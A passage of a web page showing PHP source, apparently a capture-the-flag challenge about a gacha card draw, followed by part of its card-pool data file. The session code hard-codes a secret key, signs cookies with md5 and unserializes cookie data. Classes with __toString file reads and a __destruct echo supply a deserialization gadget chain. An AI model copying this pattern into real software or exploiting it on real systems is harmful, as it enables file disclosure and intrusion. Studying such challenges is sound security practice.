punctuation\">&#123;</span>\n        <span class=\"token variable\">$six</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">session</span><span class=\"token operator\">-></span><span class=\"token function\">getAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$item</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$six</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cardsPool</span><span class=\"token operator\">-></span><span class=\"token property\">cards</span><span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$item</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$six</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">CardsPool</span>\n<span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cards</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filePath</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filePath</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$filePath</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Cards pool file doesn't exist!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">draw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$rand</span> <span class=\"token operator\">=</span> <span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$level</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span> <span class=\"token operator\">>=</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$rand</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">42</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$level</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span> <span class=\"token operator\">>=</span> <span class=\"token number\">43</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$rand</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">90</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$level</span> <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span> <span class=\"token operator\">>=</span> <span class=\"token number\">91</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$rand</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$level</span> <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$rand</span> <span class=\"token operator\">==</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$level</span> <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token variable\">$rand_key</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cards</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$level</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n            <span class=\"token string double-quoted-string\">\"stars\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$level</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string double-quoted-string\">\"No\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$rand_key</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string double-quoted-string\">\"card\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cards</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$level</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$rand_key</span><span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cards</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Session</span><span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$sessionData</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">SECRET_KEY</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">sessionData</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">sessionData</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">getAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">sessionData</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token variable\">$serialized</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">sessionData</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$sign</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$serialized</span> <span class=\"token operator\">.</span> <span class=\"token keyword static-context\">self</span><span class=\"token operator\">::</span><span class=\"token constant\">SECRET_KEY</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$value</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$serialized</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$sign</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"session\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$session</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token variable\">$sess_array</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$session</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sess_array</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$sign</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sess_array</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sign</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span> <span class=\"token operator\">.</span> <span class=\"token keyword static-context\">self</span><span class=\"token operator\">::</span><span class=\"token constant\">SECRET_KEY</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">sessionData</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">sessionData</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Go away! You hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Eeeeeeevallllllll</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"坏坏liki到此一游\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>pool.php:</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n        <span class=\"token number\">3</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token comment\">//%42</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"kokodayo~\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"狙击\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"泡普卡\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"近卫\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"炎熔\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"术士\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"斑点\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"重装\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"香草\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"先锋\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"粉毛猛男\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"医疗\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"翎羽\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"先锋\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"泡普卡\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"近卫\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"卡缇\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"重装\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"米格鲁\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"重装\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"安德切尔\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"狙击\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"芙蓉\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"医疗\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"梓兰\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"特种\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">4</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token comment\">//%48</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"NTR\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"重装\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"孑哥\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"特种\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"流泪富婆猫猫头\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"狙击\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"你滴龟神\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"重装\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"某法国干员\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"先锋\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"某暴力医生\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"医疗\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"台词烫嘴\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"type\"</span> <span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"特种\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"star\"</span> <span class=\"token operator\">=></span> <span class=\"token string double-quoted-string\">\"★★★★\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"name\"</span> <span class=\"token operator\">=></span> <span class=\"token string 